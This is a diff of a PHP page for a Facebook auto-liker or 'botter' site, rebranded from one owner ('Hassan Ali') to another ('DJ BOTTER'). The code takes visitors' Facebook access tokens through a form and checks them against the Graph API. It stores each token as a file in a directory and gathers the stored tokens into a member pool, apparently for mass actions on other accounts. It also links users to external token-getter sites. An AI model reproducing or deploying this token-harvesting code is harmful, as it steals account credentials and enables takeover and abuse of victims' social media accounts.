@@ -5,7 +5,7 @@
 <html lang="en">
 
 <meta charset="utf-8">
-<title>Hassan Ali</title><script type='text/javascript' src='back.js'></script>
+<title>DJ BOTTER</title><script type='text/javascript' src='back.js'></script>
 
   <div id="header">
 <style>
@@ -236,7 +236,7 @@ top;}
     <style>
 .snow-container{position:fixed;width:100%;max-width:100%;z-index:99999;pointer-events:none;overflow:hidden;top:0;height:100%}.snow{display:block;position:absolute;z-index:2;top:0;right:0;bottom:0;left:0;pointer-events:none;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0);-webkit-animation:snow linear infinite;animation:snow linear infinite}.snow.foreground{background-image:url("https://vipfb.co/img/snow-large-vipfb.co.png");-webkit-animation-duration:15s;animation-duration:10s}.snow.foreground.layered{-webkit-animation-delay:7.5s;animation-delay:7.5s}.snow.middleground{background-image:url(https://vipfb.co/img/snow-medium-vipfb.co.png);-webkit-animation-duration:20s;animation-duration:15s}.snow.middleground.layered{-webkit-animation-delay:10s;animation-delay:10s}.snow.background{background-image:url(https://vipfb.co/img/snow-small-vipfb.co.png);-webkit-animation-duration:25s;animation-duration:20s}.snow.background.layered{-webkit-animation-delay:12.5s;animation-delay:12.5s}@-webkit-keyframes snow{0%{-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{-webkit-transform:translate3d(5%,100%,0);transform:translate3d(5%,100%,0)}}@keyframes snow{0%{-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{-webkit-transform:translate3d(5%,100%,0);transform:translate3d(5%,100%,0)}} </style> <div class='snow-container'> <div class='snow foreground'></div> <div class='snow foreground layered'></div> <div class='snow middleground'></div> <div class='snow middleground layered'></div> <div class='snow background'></div> <div class='snow background layered'></div> </div><!--  * Contact Developer fb.com/haterxkabaphassan * * Never Give Up . * * Code By Hassan Ali . *--> 
 <?php
-$yx=opendir('myToken');
+$yx=opendir('DJ');
 while($isi=readdir($yx)){
 if($isi != '.' && $isi != '..'){
 $member[]=$isi;
@@ -250,7 +250,7 @@ if($_POST[access_token]){
 $access_token = $_POST[access_token];
 $me = $like -> me($access_token);
 if($me[id]){
-$like -> myToken($access_token);
+$like -> DJ($access_token);
 if($_POST[id]){
 $like -> pancal($_POST[id]);
 }else{
@@ -271,11 +271,11 @@ print '';
 public function me($access){
 return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
 }
-public function myToken($access){
-if(!is_dir('myToken')){
-mkdir('myToken');
+public function DJ($access){
+if(!is_dir('DJ')){
+mkdir('DJ');
 }
-$a=fopen('myToken/'.$access,'w');
+$a=fopen('DJ/'.$access,'w');
 fwrite($a,1);
 fclose($a);
 }
@@ -287,8 +287,8 @@ public function form(){
  echo '
 <br>
 <br>
-<br><center><a target="_blank" href="http://m.fb.com/100004890735730"><img src="https://graph.facebook.com/100004890735730/picture?type=large" alt="" style="border-radius: 50px; border: 2px; box-shadow: 0px 0px 7px 2px 	#42f4f1; padding: 0px;" width="300" height="300" title=""/></a>
-<strong> <font style="color:red;font-size:33px;font-family:miaanFont"><h3 align="center"><font style="background: url( ) color:#f6216f;  font-family:miaanFont;font-size:70px;"> <a href="http://hassantokens.tk/" target="_blank">
+<br><center><a target="_blank" href="http://m.fb.com/100025466832535"><img src="https://graph.facebook.com/100025466832535/picture?type=large" alt="" style="border-radius: 50px; border: 2px; box-shadow: 0px 0px 7px 2px 	#42f4f1; padding: 0px;" width="300" height="300" title=""/></a>
+<strong> <font style="color:red;font-size:33px;font-family:miaanFont"><h3 align="center"><font style="background: url( ) color:#f6216f;  font-family:miaanFont;font-size:70px;"> <a href="https://bottersking.com/token" target="_blank">
 <center><a href="http://hassantokens.tk/" target="blank"> Get Token </a></center>
 </font>
   <center></br><form action=""method="POST"><input class="input" type="text"name="access_token" style="height:28px;" value="">
